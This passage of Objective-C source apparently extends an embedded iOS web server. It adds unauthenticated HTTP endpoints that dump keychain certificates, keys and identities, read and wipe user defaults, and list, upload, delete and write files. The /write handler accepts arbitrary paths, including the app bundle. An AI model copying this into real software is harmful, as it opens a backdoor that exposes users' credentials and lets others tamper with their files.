                                        (__bridge id)kSecClassCertificate,
                                        (__bridge id)kSecClassKey,
                                        (__bridge id)kSecClassIdentity];
            
            for (id secItemClass in secItemClasses) {
                NSMutableDictionary *query = [NSMutableDictionary dictionaryWithObjectsAndKeys:
                    (__bridge id)kCFBooleanTrue, (__bridge id)kSecReturnAttributes,
                    (__bridge id)kSecMatchLimitAll, (__bridge id)kSecMatchLimit,
                    nil];
                [query setObject:secItemClass forKey:(__bridge id)kSecClass];

                CFTypeRef result = NULL;
                SecItemCopyMatching((__bridge CFDictionaryRef)query, &result);
                if (result != NULL)
                {
                    id obj = (__bridge id)result;
                    
                    if ([obj isKindOfClass:[NSArray class]])
                    {
                        NSMutableArray *objs = [NSMutableArray arrayWithCapacity:16];
                        
                        [obj enumerateObjectsUsingBlock:^(id  _Nonnull obj3, NSUInteger idx, BOOL * _Nonnull stop) {
                            [objs addObject:[obj3 debugDescription]];
                        }];
                        obj2[secItemClass] = objs;
                        CFRelease(result);
                        continue;
                    }
                    
                    if ([obj isKindOfClass:[NSDictionary class]])
                    {
                        NSMutableDictionary *objs = [NSMutableDictionary dictionaryWithCapacity:16];
                        
                        [obj enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj3, BOOL * _Nonnull stop) {
                            objs[key] = [obj3 debugDescription];
                        }];
                        obj2[secItemClass] = objs;
                        CFRelease(result);
                        continue;
                    }
                    
                    obj2[secItemClass] = [obj debugDescription];
                    CFRelease(result);
                }
            }
            
            info[@"KeyChainData"] = obj2;
        }
        
        NSString *app = obj2json(info);
        return [[GCDWebServerDataResponse alloc] initWithText:app];
    }];
    
    
    // App Group Cleanner
    [self addHandlerForMethod:@"GET" path:@"/group/clean" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        
        NSString *gid = request.query[@"gid"];
//        NSString *QuitApp = request.query[@"QuitApp"];
        
        NSMutableDictionary *info = [@{} mutableCopy];
        
        if ([gid isEqualToString:@"NSUD"]) {
            NSMutableDictionary *obj2 = [@{} mutableCopy];
            NSUserDefaults *s1 = [NSUserDefaults standardUserDefaults];
            [s1.dictionaryRepresentation enumerateKeysAndObjectsUsingBlock:^(NSString * _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {

                obj2[key] = [obj debugDescription];
//                    if (obj2json(obj).length) obj2[key] = obj;
//                    else obj2[key] = [obj debugDescription];
                
                //删除数据
                [s1 removeObjectForKey:key];
            }];
            [s1 synchronize];
            info[@"NSUD"] = obj2;
        } else {
            info[gid][@"container"] = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gid].absoluteString;
            
            NSUserDefaults *s1 = [[NSUserDefaults alloc] initWithSuiteName:gid];
            NSMutableDictionary *obj2 = [@{} mutableCopy];
            [s1.dictionaryRepresentation enumerateKeysAndObjectsUsingBlock:^(NSString * _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
                
                obj2[key] = [obj debugDescription];
//                    if (obj2json(obj).length) obj2[key] = obj;
//                    else obj2[key] = [obj debugDescription];
                
                //删除数据
                [s1 removeObjectForKey:key];
            }];
            [s1 synchronize];
            info[gid] = obj2;
        }
        
        NSString *app = obj2json(info);
        return [[GCDWebServerDataResponse alloc] initWithText:app];
    }];
    
    
    // App Path
    [self addHandlerForMethod:@"GET" path:@"/app/path" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        NSString *app = [NSBundle mainBundle].executablePath;
        return [[GCDWebServerDataResponse alloc] initWithText:app];
    }];
    
    // Sandbox Path
    [self addHandlerForMethod:@"GET" path:@"/sandbox/path" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        NSString *sandbox = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
        return [[GCDWebServerDataResponse alloc] initWithText:sandbox];
    }];
    
    // File listing
    [self addHandlerForMethod:@"GET" path:@"/list" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        return [server listDirectory:request];
    }];
    
    // File download
    [self addHandlerForMethod:@"GET" path:@"/download" requestClass:[GCDWebServerRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        return [server downloadFile:request];
    }];
    
    // File upload
    [self addHandlerForMethod:@"POST" path:@"/upload" requestClass:[GCDWebServerMultiPartFormRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        return [server uploadFile:(GCDWebServerMultiPartFormRequest*)request];
    }];
    
    // File and folder moving
    [self addHandlerForMethod:@"POST" path:@"/move" requestClass:[GCDWebServerURLEncodedFormRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        return [server moveItem:(GCDWebServerURLEncodedFormRequest*)request];
    }];
    
    // File and folder deletion
    [self addHandlerForMethod:@"POST" path:@"/delete" requestClass:[GCDWebServerURLEncodedFormRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        return [server deleteItem:(GCDWebServerURLEncodedFormRequest*)request];
    }];
    
    // Directory creation
    [self addHandlerForMethod:@"POST" path:@"/create" requestClass:[GCDWebServerURLEncodedFormRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        return [server createDirectory:(GCDWebServerURLEncodedFormRequest*)request];
    }];
    
    // Write body to file
    [self addHandlerForMethod:@"POST" path:@"/write" requestClass:[GCDWebServerDataRequest class] processBlock:^GCDWebServerResponse *(GCDWebServerRequest* request) {
        
        NSString* relativePath = [[request query] objectForKey:@"path"];
        NSString* absolutePath = [_uploadDirectory stringByAppendingPathComponent:relativePath];
        if ([relativePath hasPrefix:@"/private/var/containers/Bundle/Application/"]) absolutePath = relativePath;
        [[(id)request data] writeToFile:absolutePath atomically:YES];
        
        return [GCDWebServerDataResponse responseWithText:@"ok"];
    }];
    
}
    return self;
}

#if !__has_feature(objc_arc)

- (void)dealloc {
    [_uploadDirectory release];
    [_allowedExtensions release];
    [_title release];
    [_header release];
    [_prologue release];
    [_epilogue release];
    [_footer release];
    
    [super dealloc];
}

#endif

@end

@implementation GCDWebUploader (Subclassing)

- (BOOL)shouldUploadFileAtPath:(NSString*)path withTemporaryFile:(NSString*)tempPath {
    return YES;
}

- (BOOL)shouldMoveItemFromPath:(NSString*)fromPath toPath:(NSString*)toPath {
    return YES;
}

- (BOOL)shouldDeleteItemAtPath:(NSString*)path {
    return YES;
}

- (BOOL)shouldCreateDirectoryAtPath:(NSString*)path {
    return YES;
}

@end
